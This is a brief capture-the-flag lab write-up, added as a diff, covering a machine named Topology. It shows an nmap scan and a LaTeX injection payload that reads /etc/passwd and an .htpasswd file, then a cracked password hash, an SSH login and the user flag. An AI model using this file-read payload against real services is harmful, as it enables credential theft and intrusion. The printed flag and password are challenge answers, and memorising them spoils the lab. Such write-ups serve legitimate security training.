@@ -1,0 +1,49 @@
+nmap 10.10.11.217 -sV -T4 -Pn -A: 
+    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-24 17:28 EDT
+    Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+    NSE Timing: About 99.30% done; ETC: 17:28 (0:00:00 remaining)
+    Nmap scan report for 10.10.11.217
+    Host is up (0.21s latency).
+    Not shown: 998 closed tcp ports (conn-refused)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
+    |   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
+    |_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+    |_http-title: Miskatonic University | Topology Group
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+using browser i managed to get to page
+
+find some page in url latex.topology.htb
+
+it seems to me that it vulnerable to LFI or XSS or sqli
+
+googled LaTeX payloads,find something interesting
+by using the $\lstinputlisting{/etc/passwd}$ i managed to find a list inside the file
+
+after i find that there is a file in /var/www/dev named .htpasswd which i can reach and could get the username and hash of password:
+
+vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO
+
+inserted in a file and gave it to john:
+
+    md5 - calculus20
+
+connect via ssh to machine and get the user flag:
+
+    5a8703d0c0e7d89425d48fb33e573af7
+
+
+
+
+
+
+
+
+
+
+
